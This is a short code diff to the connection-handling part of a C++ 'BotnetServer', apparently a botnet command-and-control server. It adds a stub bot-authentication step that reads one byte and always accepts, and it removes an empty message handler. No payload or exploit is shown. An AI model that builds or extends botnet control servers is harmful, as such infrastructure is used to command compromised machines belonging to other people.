@@ -41,7 +41,6 @@ void BotnetServer::GetMessages() {
 }
 
 void BotnetServer::GetConnections() {
-
 	// Make a socket set containing only the
 	// lister to use its select function
 	Socket_Set<tcpSocket> listener_set(Socket_Set<tcpSocket>::READ);
@@ -69,10 +68,13 @@ void BotnetServer::GetConnections() {
 				try {
 					// If succedded in accepting new socket, add to master set
 					if (socket.Accept(tmpSocket)) {
-						std::unique_lock<std::mutex> master_set_ul(master_set_lock);
-						this->master_set.AddSocket(tmpSocket);
-						master_set_ul.unlock();
-						ThreadSafeLog("Connection received by socket " + tmpSocket.GetIp() + "\n");
+						// Check if incomming connection is really a bot
+						if (this->AuthenticateBot(tmpSocket)) {
+							std::unique_lock<std::mutex> master_set_ul(master_set_lock);
+							this->master_set.AddSocket(tmpSocket);
+							master_set_ul.unlock();
+							ThreadSafeLog("Connection received by socket " + tmpSocket.GetIp() + "\n");
+						}
 					}
 				}
 				catch (const std::exception& e) {
@@ -83,9 +85,11 @@ void BotnetServer::GetConnections() {
 	}
 }
 
-
-void BotnetServer::HandleMessage(const std::string& msg, const tcpSocket& socket) {}
-
+bool BotnetServer::AuthenticateBot(const tcpSocket& connection) {
+	std::string tmp;
+	MainSocket.Recv(tmp, 1,1);
+	return true;
+}
 
 std::string BotnetServer::GetCLIPrompt() const {
 	std::string prompt;
